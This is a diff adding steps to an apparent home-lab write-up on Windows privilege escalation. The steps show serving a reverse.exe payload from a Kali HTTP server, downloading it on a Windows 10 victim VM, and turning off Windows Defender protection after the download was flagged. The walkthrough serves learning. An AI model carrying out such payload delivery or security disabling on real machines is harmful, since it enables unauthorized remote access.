@@ -129,3 +129,32 @@ run
 <p align="center">
   <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step2-1.png" width="600">
 </p>
+
+Terminal 2 — Python HTTP Server
+
+```bash
+python3 -m http.server 80
+```
+
+**Output:**
+
+```text
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step2-2.png" width="600">
+</p>
+
+## Step 3 — Downloading the Payload on the Victim Machine
+
+I switched to the Windows 10 victim machine and opened Microsoft Edge. I browsed to my Kali HTTP server:
+
+```bash
+http://192.168.5.128/
+```
+I clicked reverse.exe to download it. Windows Defender blocked it at first — showing "Couldn't download - Virus detected". I turned off Real Time Protection and Threat Protection in Windows Defender settings, then the download went through successfully.
+
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step3-1.png" width="600">
+</p>
+
